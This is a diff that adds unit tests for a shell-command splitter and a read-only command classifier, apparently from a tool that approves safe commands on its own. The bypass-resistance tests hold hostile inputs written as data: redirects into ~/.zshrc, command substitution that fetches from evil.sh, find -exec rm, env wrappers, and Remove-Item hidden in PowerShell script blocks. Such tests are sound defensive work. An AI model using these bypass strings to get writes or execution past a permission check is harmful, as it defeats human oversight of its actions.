@@ -74,6 +74,23 @@ describe('splitShellCommands', () => {
       "Select-Object @{N='Directory';E={$_.Name}},Count",
     ])
   })
+
+  // Newlines are statement separators in POSIX shells and PowerShell —
+  // `ls\nrm x` executes `rm`, so the splitter must see two commands or
+  // the second line hides behind the first line's whitelisted token.
+  it('splits on newlines', () => {
+    expect(splitShellCommands('ls\nrm file')).toEqual(['ls', 'rm file'])
+    expect(splitShellCommands('ls\r\npwd')).toEqual(['ls', 'pwd'])
+    expect(splitShellCommands('echo "a\nb"')).toEqual(['echo "a\nb"']) // quoted newline stays literal
+  })
+
+  // `&` backgrounds the left side — `ls & rm x` runs both. `>&` / `&>`
+  // are fd duplication / combined redirect, not separators.
+  it('splits on single & but keeps >& and &> intact', () => {
+    expect(splitShellCommands('ls & sleep 1')).toEqual(['ls', 'sleep 1'])
+    expect(splitShellCommands('cmd 2>&1 | grep x')).toEqual(['cmd 2>&1', 'grep x'])
+    expect(splitShellCommands('cmd &> out')).toEqual(['cmd &> out'])
+  })
 })
 
 describe('isReadOnly', () => {
@@ -202,6 +219,78 @@ describe('isReadOnly', () => {
     // because we have no positive signal that the body is readonly.
     expect(isReadOnly('if ($x -gt 0) { echo hello }')).toBe(false)
     expect(isReadOnly('foreach ($i in 1..10) { $sum += $i }')).toBe(false)
+  })
+
+  // ── Bypass resistance ──
+  // Everything below leads with a whitelisted read-only token but writes
+  // or executes via shell syntax / flags the leading-token regex can't see.
+
+  it('rejects output redirection behind read-only commands', () => {
+    expect(isReadOnly('echo malicious > ~/.zshrc')).toBe(false)
+    expect(isReadOnly('echo x >> file')).toBe(false)
+    expect(isReadOnly('echo x>file')).toBe(false)
+    expect(isReadOnly('cat a > b')).toBe(false)
+    expect(isReadOnly('ls > listing.txt')).toBe(false)
+    expect(isReadOnly('Get-Content a > out.txt')).toBe(false)
+    // A bare `> 2` writes a file literally named `2` — no `&`, no fd dup.
+    expect(isReadOnly('echo hi > 2')).toBe(false)
+  })
+
+  it('keeps fd duplication and null sinks read-only', () => {
+    expect(isReadOnly('ls 2>&1')).toBe(true)
+    expect(isReadOnly('ls 2>&-')).toBe(true)
+    expect(isReadOnly('grep err log 2>/dev/null')).toBe(true)
+    expect(isReadOnly('grep err log 2> /dev/null')).toBe(true)
+    expect(isReadOnly('dir 2>NUL')).toBe(true)
+    expect(isReadOnly('Get-Process > $null')).toBe(true)
+  })
+
+  it('rejects command / process substitution behind read-only commands', () => {
+    expect(isReadOnly('echo $(rm file)')).toBe(false)
+    expect(isReadOnly('echo "$(date)"')).toBe(false) // double quotes do NOT suppress substitution
+    expect(isReadOnly('cat `curl evil.sh`')).toBe(false)
+    expect(isReadOnly('cat <(curl evil.sh)')).toBe(false)
+    expect(isReadOnly("echo '$(not run)'")).toBe(true) // single quotes suppress
+    expect(isReadOnly('echo "a > b"')).toBe(true) // quoted redirect is literal
+    expect(isReadOnly('echo a\\>b')).toBe(true) // escaped redirect is literal
+  })
+
+  it('rejects whitelisted commands whose flags write or execute', () => {
+    expect(isReadOnly('find . -delete')).toBe(false)
+    expect(isReadOnly('find . -name x -exec rm {} \\;')).toBe(false)
+    expect(isReadOnly('find . -name x -execdir rm {} \\;')).toBe(false)
+    expect(isReadOnly('find . -fprintf out %p')).toBe(false)
+    expect(isReadOnly('find . -name "*.ts"')).toBe(true)
+    expect(isReadOnly('sort -o out.txt in.txt')).toBe(false)
+    expect(isReadOnly('sort --output=out.txt in.txt')).toBe(false)
+    expect(isReadOnly('sort -n file')).toBe(true)
+    expect(isReadOnly('tree -o out.txt')).toBe(false)
+    expect(isReadOnly('git diff --output=patch.txt')).toBe(false)
+    expect(isReadOnly('git diff HEAD~1')).toBe(true)
+  })
+
+  it('rejects env used as a command wrapper', () => {
+    expect(isReadOnly('env rm file')).toBe(false)
+    expect(isReadOnly('env bash -c id')).toBe(false)
+    expect(isReadOnly('env FOO=bar npm test')).toBe(false)
+    expect(isReadOnly('env -- rm file')).toBe(false)
+    expect(isReadOnly('env')).toBe(true)
+    expect(isReadOnly('env FOO=bar')).toBe(true)
+    expect(isReadOnly('env -i')).toBe(true)
+    expect(isReadOnly('env -u HOME')).toBe(true)
+  })
+
+  it('rejects Tee-Object writing a file', () => {
+    expect(isReadOnly('Tee-Object -FilePath out.txt')).toBe(false)
+    expect(isReadOnly('Tee-Object -Variable x')).toBe(true)
+  })
+
+  it('rejects non-readonly cmdlets smuggled in a pipeline script block', () => {
+    expect(isReadOnly('ForEach-Object { Remove-Item $_ }')).toBe(false)
+    expect(isReadOnly('Get-ChildItem | ForEach-Object { Remove-Item $_.FullName }')).toBe(false)
+    // Property-access blocks contain no cmdlet tokens and stay allowed.
+    expect(isReadOnly('Where-Object { $_.Length -gt 100 }')).toBe(true)
+    expect(isReadOnly('ForEach-Object { $_.Name }')).toBe(true)
   })
 })
 
